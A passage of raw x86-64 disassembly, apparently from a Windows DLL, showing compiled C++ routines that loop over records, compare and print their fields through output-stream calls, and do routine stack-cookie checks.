   1800024b5:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800024b9:	8b b5 80 00 00 00    	mov    0x80(%rbp),%esi
   1800024bf:	f6 44 0d 80 01       	testb  $0x1,-0x80(%rbp,%rcx,1)
   1800024c4:	75 33                	jne    0x1800024f9
   1800024c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1800024cd:	00 00 00 
   1800024d0:	48 8b d3             	mov    %rbx,%rdx
   1800024d3:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1800024d8:	e8 23 8c 00 00       	call   0x18000b100
   1800024dd:	39 33                	cmp    %esi,(%rbx)
   1800024df:	74 12                	je     0x1800024f3
   1800024e1:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1800024e6:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800024ea:	f6 44 0d 80 01       	testb  $0x1,-0x80(%rbp,%rcx,1)
   1800024ef:	74 df                	je     0x1800024d0
   1800024f1:	eb 06                	jmp    0x1800024f9
   1800024f3:	41 be 01 00 00 00    	mov    $0x1,%r14d
   1800024f9:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1800024fd:	e8 ee ac 00 00       	call   0x18000d1f0
   180002502:	bf 06 00 00 00       	mov    $0x6,%edi
   180002507:	44 8d 7f fc          	lea    -0x4(%rdi),%r15d
   18000250b:	48 85 c0             	test   %rax,%rax
   18000250e:	75 2c                	jne    0x18000253c
   180002510:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180002515:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180002519:	8b c7                	mov    %edi,%eax
   18000251b:	48 83 7c 0d b8 00    	cmpq   $0x0,-0x48(%rbp,%rcx,1)
   180002521:	41 0f 45 c7          	cmovne %r15d,%eax
   180002525:	0b 44 0d 80          	or     -0x80(%rbp,%rcx,1),%eax
   180002529:	83 e0 17             	and    $0x17,%eax
   18000252c:	89 44 0d 80          	mov    %eax,-0x80(%rbp,%rcx,1)
   180002530:	8b 54 0d 84          	mov    -0x7c(%rbp,%rcx,1),%edx
   180002534:	23 d0                	and    %eax,%edx
   180002536:	0f 85 96 02 00 00    	jne    0x1800027d2
   18000253c:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180002541:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180002545:	48 8d 05 34 d8 04 00 	lea    0x4d834(%rip),%rax        # 0x18004fd80
   18000254c:	48 89 44 0c 70       	mov    %rax,0x70(%rsp,%rcx,1)
   180002551:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180002556:	48 63 48 04          	movslq 0x4(%rax),%rcx
   18000255a:	8d 91 50 ff ff ff    	lea    -0xb0(%rcx),%edx
   180002560:	89 54 0c 6c          	mov    %edx,0x6c(%rsp,%rcx,1)
   180002564:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   180002568:	e8 83 84 00 00       	call   0x18000a9f0
   18000256d:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180002572:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180002576:	48 8d 05 43 f1 03 00 	lea    0x3f143(%rip),%rax        # 0x1800416c0
   18000257d:	48 89 44 0c 70       	mov    %rax,0x70(%rsp,%rcx,1)
   180002582:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180002587:	48 63 48 04          	movslq 0x4(%rax),%rcx
   18000258b:	8d 51 e8             	lea    -0x18(%rcx),%edx
   18000258e:	89 54 0c 6c          	mov    %edx,0x6c(%rsp,%rcx,1)
   180002592:	4c 8d 25 9f ef 03 00 	lea    0x3ef9f(%rip),%r12        # 0x180041538
   180002599:	4c 89 65 20          	mov    %r12,0x20(%rbp)
   18000259d:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1800025a1:	e8 4a 48 01 00       	call   0x180016df0
   1800025a6:	90                   	nop
   1800025a7:	45 85 f6             	test   %r14d,%r14d
   1800025aa:	74 0c                	je     0x1800025b8
   1800025ac:	48 8d 15 55 cf 04 00 	lea    0x4cf55(%rip),%rdx        # 0x18004f508
   1800025b3:	e9 af 00 00 00       	jmp    0x180002667
   1800025b8:	89 33                	mov    %esi,(%rbx)
   1800025ba:	48 8d 15 6f cf 04 00 	lea    0x4cf6f(%rip),%rdx        # 0x18004f530
   1800025c1:	48 8d 0d 28 61 05 00 	lea    0x56128(%rip),%rcx        # 0x1800586f0
   1800025c8:	e8 33 cd 00 00       	call   0x18000f300
   1800025cd:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   1800025d1:	e8 1a 2a 01 00       	call   0x180014ff0
   1800025d6:	48 8d 15 5b cf 04 00 	lea    0x4cf5b(%rip),%rdx        # 0x18004f538
   1800025dd:	48 8d 0d 0c 61 05 00 	lea    0x5610c(%rip),%rcx        # 0x1800586f0
   1800025e4:	e8 17 cd 00 00       	call   0x18000f300
   1800025e9:	4c 8d 43 22          	lea    0x22(%rbx),%r8
   1800025ed:	e8 fe 29 01 00       	call   0x180014ff0
   1800025f2:	48 8d 15 4f cf 04 00 	lea    0x4cf4f(%rip),%rdx        # 0x18004f548
   1800025f9:	48 8d 0d f0 60 05 00 	lea    0x560f0(%rip),%rcx        # 0x1800586f0
   180002600:	e8 fb cc 00 00       	call   0x18000f300
   180002605:	4c 8d 43 54          	lea    0x54(%rbx),%r8
   180002609:	e8 e2 29 01 00       	call   0x180014ff0
   18000260e:	48 8d 15 43 cf 04 00 	lea    0x4cf43(%rip),%rdx        # 0x18004f558
   180002615:	48 8d 0d d4 60 05 00 	lea    0x560d4(%rip),%rcx        # 0x1800586f0
   18000261c:	e8 df cc 00 00       	call   0x18000f300
   180002621:	8b 43 64             	mov    0x64(%rbx),%eax
   180002624:	89 85 80 00 00 00    	mov    %eax,0x80(%rbp)
   18000262a:	48 8d 95 80 00 00 00 	lea    0x80(%rbp),%rdx
   180002631:	e8 ba d5 00 00       	call   0x18000fbf0
   180002636:	8b 85 80 00 00 00    	mov    0x80(%rbp),%eax
   18000263c:	89 43 64             	mov    %eax,0x64(%rbx)
   18000263f:	69 c0 84 03 00 00    	imul   $0x384,%eax,%eax
   180002645:	66 0f 6e c0          	movd   %eax,%xmm0
   180002649:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
   18000264c:	f3 0f 11 43 68       	movss  %xmm0,0x68(%rbx)
   180002651:	48 8b d3             	mov    %rbx,%rdx
   180002654:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   18000265b:	e8 f0 8d 00 00       	call   0x18000b450
   180002660:	48 8d 15 11 cf 04 00 	lea    0x4cf11(%rip),%rdx        # 0x18004f578
   180002667:	48 8d 0d 82 60 05 00 	lea    0x56082(%rip),%rcx        # 0x1800586f0
   18000266e:	e8 8d cc 00 00       	call   0x18000f300
   180002673:	48 8d 15 16 cf 04 00 	lea    0x4cf16(%rip),%rdx        # 0x18004f590
   18000267a:	48 8d 0d 6f 60 05 00 	lea    0x5606f(%rip),%rcx        # 0x1800586f0
   180002681:	e8 7a cc 00 00       	call   0x18000f300
   180002686:	e8 e1 1d 02 00       	call   0x18002446c
   18000268b:	48 8d 8d 98 00 00 00 	lea    0x98(%rbp),%rcx
   180002692:	e8 59 ab 00 00       	call   0x18000d1f0
   180002697:	48 85 c0             	test   %rax,%rax
   18000269a:	75 38                	jne    0x1800026d4
   18000269c:	48 8b 85 90 00 00 00 	mov    0x90(%rbp),%rax
   1800026a3:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800026a7:	48 83 bc 0d d8 00 00 	cmpq   $0x0,0xd8(%rbp,%rcx,1)
   1800026ae:	00 00 
   1800026b0:	41 0f 45 ff          	cmovne %r15d,%edi
   1800026b4:	0b bc 0d a0 00 00 00 	or     0xa0(%rbp,%rcx,1),%edi
   1800026bb:	83 e7 17             	and    $0x17,%edi
   1800026be:	89 bc 0d a0 00 00 00 	mov    %edi,0xa0(%rbp,%rcx,1)
   1800026c5:	8b 84 0d a4 00 00 00 	mov    0xa4(%rbp,%rcx,1),%eax
   1800026cc:	23 c7                	and    %edi,%eax
   1800026ce:	0f 85 ac 00 00 00    	jne    0x180002780
   1800026d4:	48 8b 85 90 00 00 00 	mov    0x90(%rbp),%rax
   1800026db:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800026df:	48 8d 05 82 d6 04 00 	lea    0x4d682(%rip),%rax        # 0x18004fd68
   1800026e6:	48 89 84 0d 90 00 00 	mov    %rax,0x90(%rbp,%rcx,1)
   1800026ed:	00 
   1800026ee:	48 8b 85 90 00 00 00 	mov    0x90(%rbp),%rax
   1800026f5:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800026f9:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   1800026ff:	89 94 0d 8c 00 00 00 	mov    %edx,0x8c(%rbp,%rcx,1)
   180002706:	48 8d 8d 98 00 00 00 	lea    0x98(%rbp),%rcx
   18000270d:	e8 de 82 00 00       	call   0x18000a9f0
   180002712:	48 8b 85 90 00 00 00 	mov    0x90(%rbp),%rax
   180002719:	48 63 48 04          	movslq 0x4(%rax),%rcx
   18000271d:	48 8d 05 34 ef 03 00 	lea    0x3ef34(%rip),%rax        # 0x180041658
   180002724:	48 89 84 0d 90 00 00 	mov    %rax,0x90(%rbp,%rcx,1)
   18000272b:	00 
   18000272c:	48 8b 85 90 00 00 00 	mov    0x90(%rbp),%rax
   180002733:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180002737:	8d 51 f0             	lea    -0x10(%rcx),%edx
   18000273a:	89 94 0d 8c 00 00 00 	mov    %edx,0x8c(%rbp,%rcx,1)
   180002741:	4c 89 a5 38 01 00 00 	mov    %r12,0x138(%rbp)
   180002748:	48 8d 8d 38 01 00 00 	lea    0x138(%rbp),%rcx
   18000274f:	e8 9c 46 01 00       	call   0x180016df0
   180002754:	90                   	nop
   180002755:	48 8b 8d a0 01 00 00 	mov    0x1a0(%rbp),%rcx
   18000275c:	48 33 cc             	xor    %rsp,%rcx
   18000275f:	e8 ac 51 01 00       	call   0x180017910
   180002764:	4c 8d 9c 24 b0 02 00 	lea    0x2b0(%rsp),%r11
   18000276b:	00 
   18000276c:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   180002770:	49 8b 73 40          	mov    0x40(%r11),%rsi
   180002774:	49 8b e3             	mov    %r11,%rsp
   180002777:	41 5f                	pop    %r15
   180002779:	41 5e                	pop    %r14
   18000277b:	41 5c                	pop    %r12
   18000277d:	5f                   	pop    %rdi
   18000277e:	5d                   	pop    %rbp
   18000277f:	c3                   	ret
   180002780:	a8 04                	test   $0x4,%al
   180002782:	74 09                	je     0x18000278d
   180002784:	48 8d 1d 65 ca 04 00 	lea    0x4ca65(%rip),%rbx        # 0x18004f1f0
   18000278b:	eb 14                	jmp    0x1800027a1
   18000278d:	a8 02                	test   $0x2,%al
   18000278f:	48 8d 1d 72 ca 04 00 	lea    0x4ca72(%rip),%rbx        # 0x18004f208
   180002796:	48 8d 05 83 ca 04 00 	lea    0x4ca83(%rip),%rax        # 0x18004f220
   18000279d:	48 0f 44 d8          	cmove  %rax,%rbx
   1800027a1:	ba 01 00 00 00       	mov    $0x1,%edx
   1800027a6:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800027ab:	e8 c0 ed ff ff       	call   0x180001570
   1800027b0:	4c 8b c0             	mov    %rax,%r8
   1800027b3:	48 8b d3             	mov    %rbx,%rdx
   1800027b6:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800027bb:	e8 20 f6 ff ff       	call   0x180001de0
   1800027c0:	48 8d 15 a1 31 05 00 	lea    0x531a1(%rip),%rdx        # 0x180055968
   1800027c7:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800027cc:	e8 fb 6f 01 00       	call   0x1800197cc
   1800027d1:	90                   	nop
   1800027d2:	f6 c2 04             	test   $0x4,%dl
   1800027d5:	74 09                	je     0x1800027e0
   1800027d7:	48 8d 1d 12 ca 04 00 	lea    0x4ca12(%rip),%rbx        # 0x18004f1f0
   1800027de:	eb 15                	jmp    0x1800027f5
   1800027e0:	41 84 d7             	test   %dl,%r15b
   1800027e3:	48 8d 1d 1e ca 04 00 	lea    0x4ca1e(%rip),%rbx        # 0x18004f208
   1800027ea:	48 8d 05 2f ca 04 00 	lea    0x4ca2f(%rip),%rax        # 0x18004f220
   1800027f1:	48 0f 44 d8          	cmove  %rax,%rbx
   1800027f5:	ba 01 00 00 00       	mov    $0x1,%edx
   1800027fa:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800027ff:	e8 6c ed ff ff       	call   0x180001570
   180002804:	4c 8b c0             	mov    %rax,%r8
   180002807:	48 8b d3             	mov    %rbx,%rdx
   18000280a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   18000280f:	e8 cc f5 ff ff       	call   0x180001de0
   180002814:	48 8d 15 4d 31 05 00 	lea    0x5314d(%rip),%rdx        # 0x180055968
   18000281b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180002820:	e8 a7 6f 01 00       	call   0x1800197cc
   180002825:	cc                   	int3
   180002826:	cc                   	int3
   180002827:	cc                   	int3
   180002828:	cc                   	int3
   180002829:	cc                   	int3
   18000282a:	cc                   	int3
   18000282b:	cc                   	int3
   18000282c:	cc                   	int3
   18000282d:	cc                   	int3
   18000282e:	cc                   	int3
   18000282f:	cc                   	int3
   180002830:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002835:	57                   	push   %rdi
   180002836:	48 83 ec 20          	sub    $0x20,%rsp
   18000283a:	48 8b d9             	mov    %rcx,%rbx
   18000283d:	48 8d b9 a8 00 00 00 	lea    0xa8(%rcx),%rdi
   180002844:	48 8b 01             	mov    (%rcx),%rax
   180002847:	48 63 50 04          	movslq 0x4(%rax),%rdx
   18000284b:	48 8d 05 16 d5 04 00 	lea    0x4d516(%rip),%rax        # 0x18004fd68
   180002852:	48 89 84 3a 58 ff ff 	mov    %rax,-0xa8(%rdx,%rdi,1)
   180002859:	ff 
   18000285a:	48 8b 01             	mov    (%rcx),%rax
   18000285d:	48 63 50 04          	movslq 0x4(%rax),%rdx
   180002861:	44 8d 82 58 ff ff ff 	lea    -0xa8(%rdx),%r8d
   180002868:	44 89 84 3a 54 ff ff 	mov    %r8d,-0xac(%rdx,%rdi,1)
   18000286f:	ff 
   180002870:	48 8d 8f 60 ff ff ff 	lea    -0xa0(%rdi),%rcx
   180002877:	e8 74 81 00 00       	call   0x18000a9f0
   18000287c:	48 8b 03             	mov    (%rbx),%rax
   18000287f:	48 63 50 04          	movslq 0x4(%rax),%rdx
   180002883:	48 8d 05 ce ed 03 00 	lea    0x3edce(%rip),%rax        # 0x180041658
   18000288a:	48 89 84 3a 58 ff ff 	mov    %rax,-0xa8(%rdx,%rdi,1)
   180002891:	ff 
   180002892:	48 8b 03             	mov    (%rbx),%rax
   180002895:	48 63 50 04          	movslq 0x4(%rax),%rdx
   180002899:	44 8d 42 f0          	lea    -0x10(%rdx),%r8d
   18000289d:	44 89 84 3a 54 ff ff 	mov    %r8d,-0xac(%rdx,%rdi,1)
   1800028a4:	ff 
   1800028a5:	48 8d 05 8c ec 03 00 	lea    0x3ec8c(%rip),%rax        # 0x180041538
   1800028ac:	48 89 07             	mov    %rax,(%rdi)
   1800028af:	48 8b cf             	mov    %rdi,%rcx
   1800028b2:	e8 39 45 01 00       	call   0x180016df0
   1800028b7:	90                   	nop
   1800028b8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800028bd:	48 83 c4 20          	add    $0x20,%rsp
   1800028c1:	5f                   	pop    %rdi
   1800028c2:	c3                   	ret
   1800028c3:	cc                   	int3
   1800028c4:	cc                   	int3
   1800028c5:	cc                   	int3
   1800028c6:	cc                   	int3
   1800028c7:	cc                   	int3
   1800028c8:	cc                   	int3
   1800028c9:	cc                   	int3
   1800028ca:	cc                   	int3
   1800028cb:	cc                   	int3
   1800028cc:	cc                   	int3
   1800028cd:	cc                   	int3
   1800028ce:	cc                   	int3
   1800028cf:	cc                   	int3
   1800028d0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800028d5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800028da:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1800028df:	55                   	push   %rbp
   1800028e0:	48 8d ac 24 70 ff ff 	lea    -0x90(%rsp),%rbp
   1800028e7:	ff 
   1800028e8:	48 81 ec 90 01 00 00 	sub    $0x190,%rsp
   1800028ef:	48 8b 05 62 47 05 00 	mov    0x54762(%rip),%rax        # 0x180057058
   1800028f6:	48 33 c4             	xor    %rsp,%rax
   1800028f9:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   180002900:	48 8b f9             	mov    %rcx,%rdi
   180002903:	48 8d 15 0e ca 04 00 	lea    0x4ca0e(%rip),%rdx        # 0x18004f318
   18000290a:	48 8d 0d df 5d 05 00 	lea    0x55ddf(%rip),%rcx        # 0x1800586f0
   180002911:	e8 ea c9 00 00       	call   0x18000f300
   180002916:	48 8d 15 8b c9 04 00 	lea    0x4c98b(%rip),%rdx        # 0x18004f2a8
   18000291d:	48 8d 0d cc 5d 05 00 	lea    0x55dcc(%rip),%rcx        # 0x1800586f0
   180002924:	e8 d7 c9 00 00       	call   0x18000f300
   180002929:	48 8d 15 00 ca 04 00 	lea    0x4ca00(%rip),%rdx        # 0x18004f330
   180002930:	48 8d 0d b9 5d 05 00 	lea    0x55db9(%rip),%rcx        # 0x1800586f0
   180002937:	e8 c4 c9 00 00       	call   0x18000f300
   18000293c:	48 8d 15 05 ca 04 00 	lea    0x4ca05(%rip),%rdx        # 0x18004f348
   180002943:	48 8d 0d a6 5d 05 00 	lea    0x55da6(%rip),%rcx        # 0x1800586f0
   18000294a:	e8 b1 c9 00 00       	call   0x18000f300
   18000294f:	48 8d 15 da c9 04 00 	lea    0x4c9da(%rip),%rdx        # 0x18004f330
   180002956:	48 8d 0d 93 5d 05 00 	lea    0x55d93(%rip),%rcx        # 0x1800586f0
   18000295d:	e8 9e c9 00 00       	call   0x18000f300
   180002962:	48 8d 15 af c9 04 00 	lea    0x4c9af(%rip),%rdx        # 0x18004f318
   180002969:	48 8d 0d 80 5d 05 00 	lea    0x55d80(%rip),%rcx        # 0x1800586f0
   180002970:	e8 8b c9 00 00       	call   0x18000f300
   180002975:	48 8d 15 2c c9 04 00 	lea    0x4c92c(%rip),%rdx        # 0x18004f2a8
   18000297c:	48 8d 0d 6d 5d 05 00 	lea    0x55d6d(%rip),%rcx        # 0x1800586f0
   180002983:	e8 78 c9 00 00       	call   0x18000f300
   180002988:	33 d2                	xor    %edx,%edx
   18000298a:	41 b8 10 01 00 00    	mov    $0x110,%r8d
   180002990:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180002995:	e8 b6 75 01 00       	call   0x180019f50
   18000299a:	48 8d 15 07 cb 04 00 	lea    0x4cb07(%rip),%rdx        # 0x18004f4a8
   1800029a1:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1800029a6:	e8 15 72 00 00       	call   0x180009bc0
   1800029ab:	90                   	nop
   1800029ac:	48 8d 15 05 cc 04 00 	lea    0x4cc05(%rip),%rdx        # 0x18004f5b8
   1800029b3:	48 8d 0d 36 5d 05 00 	lea    0x55d36(%rip),%rcx        # 0x1800586f0
   1800029ba:	e8 41 c9 00 00       	call   0x18000f300
   1800029bf:	8b 85 80 00 00 00    	mov    0x80(%rbp),%eax
   1800029c5:	89 85 80 00 00 00    	mov    %eax,0x80(%rbp)
   1800029cb:	48 8d 95 80 00 00 00 	lea    0x80(%rbp),%rdx
   1800029d2:	e8 19 d2 00 00       	call   0x18000fbf0
   1800029d7:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1800029dc:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800029e0:	8b 9d 80 00 00 00    	mov    0x80(%rbp),%ebx
   1800029e6:	f6 44 0d 80 01       	testb  $0x1,-0x80(%rbp,%rcx,1)
   1800029eb:	0f 85 a0 01 00 00    	jne    0x180002b91
   1800029f1:	8b b5 80 00 00 00    	mov    0x80(%rbp),%esi
   1800029f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1800029fe:	00 00 
   180002a00:	48 8b d7             	mov    %rdi,%rdx
   180002a03:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180002a08:	e8 f3 86 00 00       	call   0x18000b100
   180002a0d:	39 37                	cmp    %esi,(%rdi)
   180002a0f:	0f 85 68 01 00 00    	jne    0x180002b7d
   180002a15:	48 8d 15 fc c8 04 00 	lea    0x4c8fc(%rip),%rdx        # 0x18004f318
   180002a1c:	48 8d 0d cd 5c 05 00 	lea    0x55ccd(%rip),%rcx        # 0x1800586f0
   180002a23:	e8 d8 c8 00 00       	call   0x18000f300
   180002a28:	48 8d 15 79 c8 04 00 	lea    0x4c879(%rip),%rdx        # 0x18004f2a8
   180002a2f:	48 8d 0d ba 5c 05 00 	lea    0x55cba(%rip),%rcx        # 0x1800586f0
   180002a36:	e8 c5 c8 00 00       	call   0x18000f300
   180002a3b:	48 8d 15 ee c8 04 00 	lea    0x4c8ee(%rip),%rdx        # 0x18004f330
   180002a42:	48 8d 0d a7 5c 05 00 	lea    0x55ca7(%rip),%rcx        # 0x1800586f0
   180002a49:	e8 b2 c8 00 00       	call   0x18000f300
   180002a4e:	48 8d 15 f3 c8 04 00 	lea    0x4c8f3(%rip),%rdx        # 0x18004f348
   180002a55:	48 8d 0d 94 5c 05 00 	lea    0x55c94(%rip),%rcx        # 0x1800586f0
   180002a5c:	e8 9f c8 00 00       	call   0x18000f300
   180002a61:	48 8d 15 c8 c8 04 00 	lea    0x4c8c8(%rip),%rdx        # 0x18004f330
   180002a68:	48 8d 0d 81 5c 05 00 	lea    0x55c81(%rip),%rcx        # 0x1800586f0
   180002a6f:	e8 8c c8 00 00       	call   0x18000f300
   180002a74:	48 8d 15 9d c8 04 00 	lea    0x4c89d(%rip),%rdx        # 0x18004f318
   180002a7b:	48 8d 0d 6e 5c 05 00 	lea    0x55c6e(%rip),%rcx        # 0x1800586f0
   180002a82:	e8 79 c8 00 00       	call   0x18000f300
   180002a87:	48 8d 15 1a c8 04 00 	lea    0x4c81a(%rip),%rdx        # 0x18004f2a8
   180002a8e:	48 8d 0d 5b 5c 05 00 	lea    0x55c5b(%rip),%rcx        # 0x1800586f0
   180002a95:	e8 66 c8 00 00       	call   0x18000f300
   180002a9a:	48 8d 15 2f cb 04 00 	lea    0x4cb2f(%rip),%rdx        # 0x18004f5d0
   180002aa1:	48 8d 0d 48 5c 05 00 	lea    0x55c48(%rip),%rcx        # 0x1800586f0
   180002aa8:	e8 53 c8 00 00       	call   0x18000f300
   180002aad:	48 8d 15 34 cb 04 00 	lea    0x4cb34(%rip),%rdx        # 0x18004f5e8
   180002ab4:	48 8d 0d 35 5c 05 00 	lea    0x55c35(%rip),%rcx        # 0x1800586f0
   180002abb:	e8 40 c8 00 00       	call   0x18000f300
   180002ac0:	48 8d 15 31 ca 04 00 	lea    0x4ca31(%rip),%rdx        # 0x18004f4f8
   180002ac7:	48 8d 0d 22 5c 05 00 	lea    0x55c22(%rip),%rcx        # 0x1800586f0
   180002ace:	e8 2d c8 00 00       	call   0x18000f300
   180002ad3:	48 8b c8             	mov    %rax,%rcx
   180002ad6:	8b 17                	mov    (%rdi),%edx
   180002ad8:	e8 13 8d 00 00       	call   0x18000b7f0
   180002add:	48 8d 15 1c cb 04 00 	lea    0x4cb1c(%rip),%rdx        # 0x18004f600
   180002ae4:	48 8d 0d 05 5c 05 00 	lea    0x55c05(%rip),%rcx        # 0x1800586f0
   180002aeb:	e8 10 c8 00 00       	call   0x18000f300
   180002af0:	48 8b c8             	mov    %rax,%rcx
   180002af3:	48 8d 57 04          	lea    0x4(%rdi),%rdx
   180002af7:	e8 04 c8 00 00       	call   0x18000f300
   180002afc:	48 8d 15 0d cb 04 00 	lea    0x4cb0d(%rip),%rdx        # 0x18004f610
   180002b03:	48 8d 0d e6 5b 05 00 	lea    0x55be6(%rip),%rcx        # 0x1800586f0
   180002b0a:	e8 f1 c7 00 00       	call   0x18000f300
   180002b0f:	48 8b c8             	mov    %rax,%rcx
   180002b12:	48 8d 57 22          	lea    0x22(%rdi),%rdx
   180002b16:	e8 e5 c7 00 00       	call   0x18000f300
   180002b1b:	48 8d 15 fe ca 04 00 	lea    0x4cafe(%rip),%rdx        # 0x18004f620
   180002b22:	48 8d 0d c7 5b 05 00 	lea    0x55bc7(%rip),%rcx        # 0x1800586f0
   180002b29:	e8 d2 c7 00 00       	call   0x18000f300
   180002b2e:	48 8b c8             	mov    %rax,%rcx
   180002b31:	48 8d 57 54          	lea    0x54(%rdi),%rdx
   180002b35:	e8 c6 c7 00 00       	call   0x18000f300
   180002b3a:	48 8d 15 ef ca 04 00 	lea    0x4caef(%rip),%rdx        # 0x18004f630
   180002b41:	48 8d 0d a8 5b 05 00 	lea    0x55ba8(%rip),%rcx        # 0x1800586f0
   180002b48:	e8 b3 c7 00 00       	call   0x18000f300
   180002b4d:	48 8b c8             	mov    %rax,%rcx
   180002b50:	8b 57 64             	mov    0x64(%rdi),%edx
   180002b53:	e8 98 8c 00 00       	call   0x18000b7f0
   180002b58:	48 8d 15 e1 ca 04 00 	lea    0x4cae1(%rip),%rdx        # 0x18004f640
   180002b5f:	48 8d 0d 8a 5b 05 00 	lea    0x55b8a(%rip),%rcx        # 0x1800586f0
   180002b66:	e8 95 c7 00 00       	call   0x18000f300
   180002b6b:	48 8b c8             	mov    %rax,%rcx
   180002b6e:	f3 0f 10 4f 68       	movss  0x68(%rdi),%xmm1
   180002b73:	e8 58 8a 00 00       	call   0x18000b5d0
   180002b78:	bb 01 00 00 00       	mov    $0x1,%ebx
   180002b7d:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180002b82:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180002b86:	f6 44 0d 80 01       	testb  $0x1,-0x80(%rbp,%rcx,1)
   180002b8b:	0f 84 6f fe ff ff    	je     0x180002a00
   180002b91:	85 db                	test   %ebx,%ebx
   180002b93:	75 13                	jne    0x180002ba8
   180002b95:	48 8d 15 b4 ca 04 00 	lea    0x4cab4(%rip),%rdx        # 0x18004f650
   180002b9c:	48 8d 0d 4d 5b 05 00 	lea    0x55b4d(%rip),%rcx        # 0x1800586f0
   180002ba3:	e8 58 c7 00 00       	call   0x18000f300
   180002ba8:	48 8d 15 d1 ca 04 00 	lea    0x4cad1(%rip),%rdx        # 0x18004f680
   180002baf:	48 8d 0d 3a 5b 05 00 	lea    0x55b3a(%rip),%rcx        # 0x1800586f0
   180002bb6:	e8 45 c7 00 00       	call   0x18000f300
   180002bbb:	e8 ac 18 02 00       	call   0x18002446c
   180002bc0:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   180002bc4:	e8 27 a6 00 00       	call   0x18000d1f0
   180002bc9:	48 85 c0             	test   %rax,%rax
   180002bcc:	75 33                	jne    0x180002c01
   180002bce:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180002bd3:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180002bd7:	b8 06 00 00 00       	mov    $0x6,%eax
   180002bdc:	ba 02 00 00 00       	mov    $0x2,%edx
   180002be1:	48 83 7c 0d b8 00    	cmpq   $0x0,-0x48(%rbp,%rcx,1)
   180002be7:	0f 45 c2             	cmovne %edx,%eax
   180002bea:	0b 44 0d 80          	or     -0x80(%rbp,%rcx,1),%eax
   180002bee:	83 e0 17             	and    $0x17,%eax
   180002bf1:	89 44 0d 80          	mov    %eax,-0x80(%rbp,%rcx,1)
   180002bf5:	8b 54 0d 84          	mov    -0x7c(%rbp,%rcx,1),%edx
   180002bf9:	23 d0                	and    %eax,%edx
   180002bfb:	0f 85 93 00 00 00    	jne    0x180002c94
   180002c01:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180002c06:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180002c0a:	48 8d 05 6f d1 04 00 	lea    0x4d16f(%rip),%rax        # 0x18004fd80
   180002c11:	48 89 44 0c 70       	mov    %rax,0x70(%rsp,%rcx,1)
   180002c16:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180002c1b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180002c1f:	8d 91 50 ff ff ff    	lea    -0xb0(%rcx),%edx
   180002c25:	89 54 0c 6c          	mov    %edx,0x6c(%rsp,%rcx,1)
   180002c29:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   180002c2d:	e8 be 7d 00 00       	call   0x18000a9f0
   180002c32:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180002c37:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180002c3b:	48 8d 05 7e ea 03 00 	lea    0x3ea7e(%rip),%rax        # 0x1800416c0
   180002c42:	48 89 44 0c 70       	mov    %rax,0x70(%rsp,%rcx,1)
   180002c47:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180002c4c:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180002c50:	8d 51 e8             	lea    -0x18(%rcx),%edx
   180002c53:	89 54 0c 6c          	mov    %edx,0x6c(%rsp,%rcx,1)
   180002c57:	48 8d 05 da e8 03 00 	lea    0x3e8da(%rip),%rax        # 0x180041538
   180002c5e:	48 89 45 20          	mov    %rax,0x20(%rbp)
   180002c62:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   180002c66:	e8 85 41 01 00       	call   0x180016df0
   180002c6b:	90                   	nop
   180002c6c:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   180002c73:	48 33 cc             	xor    %rsp,%rcx
